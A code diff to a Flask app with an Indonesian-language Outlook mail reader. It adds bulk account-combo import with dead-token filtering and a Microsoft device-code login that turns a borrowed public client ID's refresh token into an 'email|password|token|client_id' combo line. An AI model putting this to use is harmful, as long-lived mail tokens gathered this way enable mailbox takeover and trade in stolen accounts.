-                selectOutlookAccount(0);
-              }
+              deadCount++;
             }
           }
         }
@@ -4080,9 +4335,18 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         }
         await Promise.all(pool);
         saveOutlookAccountsStorage();
+        renderAccountsList();
+
+        if (deadCount > 0 && addedCount === 0) {
+          showToast(`Email / Token Invalid atau Kedaluwarsa (${deadCount} akun invalid diabaikan)`, 'fa-solid fa-triangle-exclamation text-danger');
+        } else if (deadCount > 0) {
+          showToast(`Berhasil menambah ${addedCount} akun (${deadCount} akun invalid diabaikan)`, 'fa-solid fa-circle-check text-warning');
+        } else if (addedCount > 0) {
+          showToast(`Berhasil menambahkan ${addedCount} akun aktif`, 'fa-solid fa-circle-check text-success');
+        }
 
       } catch (err) {
-        showToast('Failed: ' + err.message, 'fa-solid fa-circle-xmark text-danger');
+        showToast('Gagal memproses file: ' + err.message, 'fa-solid fa-circle-xmark text-danger');
         renderAccountsList();
       }
     }
@@ -4115,12 +4379,133 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       }
     }
 
+    let deviceAuthTimer = null;
+    let currentDeviceCode = '';
+    let currentDeviceResultLine = '';
+
+    async function openDeviceAuthModal() {
+      stopDeviceAuthPolling();
+      const modalEl = document.getElementById('deviceAuthModal');
+      if (!modalEl) return;
+      
+      document.getElementById('deviceAuthStepLoading').style.display = 'block';
+      document.getElementById('deviceAuthStepCode').style.display = 'none';
+      document.getElementById('deviceAuthStepSuccess').style.display = 'none';
+
+      let modalInst = bootstrap.Modal.getInstance(modalEl);
+      if (!modalInst) modalInst = new bootstrap.Modal(modalEl);
+      modalInst.show();
+
+      try {
+        const res = await fetch('/api/oauth/device/start', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753' })
+        });
+        const json = await res.json();
+        if (!json.ok || !json.data) {
+          throw new Error(json.error || 'Gagal menghubungi server otorisasi Microsoft');
+        }
+
+        const data = json.data;
+        currentDeviceCode = data.device_code;
+        document.getElementById('deviceAuthUserCode').textContent = data.user_code;
+        
+        const loginUrl = data.verification_uri || 'https://microsoft.com/devicelogin';
+        const btnLink = document.getElementById('deviceAuthLoginLink');
+        if (btnLink) btnLink.href = loginUrl;
+
+        document.getElementById('deviceAuthStepLoading').style.display = 'none';
+        document.getElementById('deviceAuthStepCode').style.display = 'block';
+
+        const intervalMs = Math.max(3000, (data.interval || 5) * 1000);
+        deviceAuthTimer = setInterval(pollDeviceToken, intervalMs);
+
+      } catch (err) {
+        document.getElementById('deviceAuthStepLoading').innerHTML = `
+          <i class="fa-solid fa-triangle-exclamation text-danger fa-2x mb-2"></i>
+          <p class="text-danger small mb-0">${err.message}</p>
+        `;
+      }
+    }
+
+    function stopDeviceAuthPolling() {
+      if (deviceAuthTimer) {
+        clearInterval(deviceAuthTimer);
+        deviceAuthTimer = null;
+      }
+      currentDeviceCode = '';
+    }
+
+    async function pollDeviceToken() {
+      if (!currentDeviceCode) return;
+      try {
+        const res = await fetch('/api/oauth/device/poll', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+            device_code: currentDeviceCode
+          })
+        });
+        const json = await res.json();
+        if (json.status === 'pending') {
+          return; // Masih menunggu approval user
+        }
+
+        stopDeviceAuthPolling();
+
+        if (json.ok && json.status === 'success') {
+          currentDeviceResultLine = json.combo_line;
+          document.getElementById('deviceAuthStepCode').style.display = 'none';
+          document.getElementById('deviceAuthStepSuccess').style.display = 'block';
+          document.getElementById('deviceAuthSuccessEmail').textContent = `Email Akun: ${json.email}`;
+          document.getElementById('deviceAuthResultLine').value = json.combo_line;
+          showToast('✅ Token Microsoft resmi berhasil didapatkan!', 'fa-solid fa-circle-check text-success');
+        } else {
+          showToast(json.error || 'Otorisasi gagal atau ditolak', 'fa-solid fa-circle-xmark text-danger');
+          const stEl = document.getElementById('deviceAuthStatusText');
+          if (stEl) stEl.textContent = json.error || 'Otorisasi gagal';
+        }
+      } catch (err) {
+        console.error('Poll error:', err);
+      }
+    }
+
+    function copyDeviceUserCode() {
+      const code = document.getElementById('deviceAuthUserCode')?.textContent?.trim();
+      if (!code) return;
+      copyToClipboard(code, '✓ Kode Otorisasi Disalin!', 'fa-solid fa-copy text-warning');
+    }
+
+    function copyDeviceResultLine() {
+      if (!currentDeviceResultLine) return;
+      copyToClipboard(currentDeviceResultLine, '✓ Token Format Mail Reader Disalin!', 'fa-solid fa-key text-warning');
+    }
+
+    async function applyDeviceTokenToMailReader() {
+      if (!currentDeviceResultLine) return;
+      const modalEl = document.getElementById('deviceAuthModal');
+      if (modalEl && window.bootstrap && bootstrap.Modal) {
+        const inst = bootstrap.Modal.getInstance(modalEl);
+        if (inst) inst.hide();
+      }
+      switchMainTab('mail');
+      await importAccountsFromText(currentDeviceResultLine);
+    }
+
     async function submitNewOutlookAccounts() {
       const inputEl = document.getElementById('modalAccountInput');
+      const fileEl = document.getElementById('modalFileInput');
       const proxyEl = document.getElementById('modalProxyInput');
       const text = inputEl ? inputEl.value.trim() : '';
       const proxy = proxyEl ? proxyEl.value.trim() : '';
       if (!text) return showToast('Silakan masukkan token / akun atau upload file .txt!', 'fa-solid fa-triangle-exclamation text-warning');
+
+      // Clear input fields immediately for next use
+      if (inputEl) inputEl.value = '';
+      if (fileEl) fileEl.value = '';
+      if (proxyEl) proxyEl.value = '';
 
       // Force close modal
       try {
@@ -4176,14 +4561,16 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       } else {
         badge.className = 'badge bg-danger text-light px-2 py-1';
         badge.innerHTML = getI18nText('tm_badge_disconnected', '● Disconnected');
-        document.getElementById('tmMessagesContainer').innerHTML = `<div class="text-center py-5 small text-danger"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br>Error loading inbox.<br><small class="text-secondary">${acc.error || 'Dead Account / Token Expired'}</small></div>`;
+        let errDesc = 'Email / Token Invalid atau Kedaluwarsa';
+        document.getElementById('tmMessagesContainer').innerHTML = `<div class="text-center py-5 small text-danger"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br><strong>${errDesc}</strong></div>`;
         document.getElementById('tmReaderContent').innerHTML = `
           <div class="text-center text-muted my-auto">
             <i class="fa-solid fa-triangle-exclamation fa-3x mb-3 text-danger"></i>
-            <h5 class="text-danger">Disconnected / DEAD</h5>
-            <p class="small text-secondary px-3">${acc.error || 'Token invalid or expired.'}</p>
+            <h5 class="text-danger">Email / Token Invalid</h5>
+            <p class="small text-secondary px-3">${errDesc}</p>
           </div>
         `;
+        showToast(errDesc, 'fa-solid fa-triangle-exclamation text-danger');
       }
     }
 
@@ -4272,7 +4659,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         });
 
         if (!data.ok) {
-          container.innerHTML = `<div class="text-center text-danger py-5 small">${data.error || 'Gagal memuat pesan'}</div>`;
+          let errDesc = 'Email / Token Invalid atau Kedaluwarsa';
+          container.innerHTML = `<div class="text-center text-danger py-5 small"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br><strong>${errDesc}</strong></div>`;
+          showToast(errDesc, 'fa-solid fa-triangle-exclamation text-danger');
           return;
         }
 
@@ -4280,7 +4669,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         renderCurrentMessages();
 
       } catch (err) {
-        container.innerHTML = `<div class="text-center text-danger py-5 small">${err.message}</div>`;
+        let errDesc = 'Email / Token Invalid atau Kedaluwarsa';
+        container.innerHTML = `<div class="text-center text-danger py-5 small"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br><strong>${errDesc}</strong></div>`;
+        showToast(errDesc, 'fa-solid fa-triangle-exclamation text-danger');
       }
     }
 
@@ -4307,7 +4698,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         });
 
         if (!data.ok) {
-          reader.innerHTML = `<div class="text-center text-danger my-auto">${data.error || 'Gagal membaca email'}</div>`;
+          let errDesc = 'Email / Token Invalid atau Gagal Memuat Surat';
+          reader.innerHTML = `<div class="text-center text-danger my-auto"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br><strong>${errDesc}</strong></div>`;
+          showToast(errDesc, 'fa-solid fa-triangle-exclamation text-danger');
           return;
         }
 
@@ -4347,7 +4740,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
           </div>
         `;
       } catch (err) {
-        reader.innerHTML = `<div class="text-center text-danger my-auto">${err.message}</div>`;
+        let errDesc = 'Email / Token Invalid atau Gagal Memuat Surat';
+        reader.innerHTML = `<div class="text-center text-danger my-auto"><i class="fa-solid fa-circle-exclamation fa-2x mb-2 text-danger"></i><br><strong>${errDesc}</strong></div>`;
+        showToast(errDesc, 'fa-solid fa-triangle-exclamation text-danger');
       }
     }
 
@@ -4588,6 +4983,23 @@ HTML_TEMPLATE = """<!DOCTYPE html>
       // Cleanup any stuck modal backdrops
       document.querySelectorAll('.modal-backdrop').forEach(b => b.remove());
       document.body.classList.remove('modal-open');
+
+      // Auto-clear & focus Add Account Modal inputs whenever opened
+      const addModalEl = document.getElementById('addAccountModal');
+      if (addModalEl) {
+        addModalEl.addEventListener('show.bs.modal', function () {
+          const inputEl = document.getElementById('modalAccountInput');
+          if (inputEl) inputEl.value = '';
+          const fileEl = document.getElementById('modalFileInput');
+          if (fileEl) fileEl.value = '';
+          const proxyEl = document.getElementById('modalProxyInput');
+          if (proxyEl) proxyEl.value = '';
+        });
+        addModalEl.addEventListener('shown.bs.modal', function () {
+          const inputEl = document.getElementById('modalAccountInput');
+          if (inputEl) inputEl.focus();
+        });
+      }
 
       loadOutlookAccountsStorage();
     });
@@ -5445,6 +5857,78 @@ def api_mail_message():
 
     data = fetch_message_detail(message_id=message_id, refresh_token=refresh_token, client_id=client_id, proxy=proxy)
     return jsonify(data)
+
+@app.route("/api/oauth/device/start", methods=["POST"])
+def api_oauth_device_start():
+    payload = request.get_json(force=True) or {}
+    client_id = payload.get("client_id") or DEFAULT_CLIENT_ID
+    scope = payload.get("scope") or "offline_access https://graph.microsoft.com/Mail.Read User.Read"
+    try:
+        r = requests.post(
+            "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",
+            data={"client_id": client_id, "scope": scope},
+            timeout=15
+        )
+        if r.status_code == 200:
+            return jsonify({"ok": True, "data": r.json()})
+        else:
+            return jsonify({"ok": False, "error": r.text}), 400
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 500
+
+@app.route("/api/oauth/device/poll", methods=["POST"])
+def api_oauth_device_poll():
+    payload = request.get_json(force=True) or {}
+    client_id = payload.get("client_id") or DEFAULT_CLIENT_ID
+    device_code = payload.get("device_code", "").strip()
+    if not device_code:
+        return jsonify({"ok": False, "error": "device_code is required"}), 400
+    try:
+        r = requests.post(
+            "https://login.microsoftonline.com/common/oauth2/v2.0/token",
+            data={
+                "client_id": client_id,
+                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+                "device_code": device_code
+            },
+            timeout=15
+        )
+        res_data = r.json()
+        if r.status_code == 200:
+            refresh_token = res_data.get("refresh_token", "")
+            access_token = res_data.get("access_token", "")
+            email = "microsoft_user@hotmail.com"
+            if access_token:
+                try:
+                    me_res = requests.get(
+                        "https://graph.microsoft.com/v1.0/me",
+                        headers={"Authorization": f"Bearer {access_token}"},
+                        timeout=10
+                    )
+                    if me_res.status_code == 200:
+                        me_data = me_res.json()
+                        email = me_data.get("userPrincipalName") or me_data.get("mail") or email
+                except Exception:
+                    pass
+            combo_line = f"{email}|password|{refresh_token}|{client_id}"
+            return jsonify({
+                "ok": True,
+                "status": "success",
+                "email": email,
+                "refresh_token": refresh_token,
+                "client_id": client_id,
+                "combo_line": combo_line
+            })
+        elif res_data.get("error") == "authorization_pending":
+            return jsonify({"ok": True, "status": "pending"})
+        elif res_data.get("error") == "authorization_declined":
+            return jsonify({"ok": False, "status": "declined", "error": "Otorisasi dibatalkan / ditolak pengguna."})
+        elif res_data.get("error") == "expired_token":
+            return jsonify({"ok": False, "status": "expired", "error": "Waktu otorisasi telah habis. Silakan coba kembali."})
+        else:
+            return jsonify({"ok": False, "status": "error", "error": res_data.get("error_description") or res_data.get("error") or "Gagal mendapatkan token"})
+    except Exception as e:
+        return jsonify({"ok": False, "error": str(e)}), 500
 
 @app.route("/check_single_proxy", methods=["POST"])
 @app.route("/api/check_single_proxy", methods=["POST"])
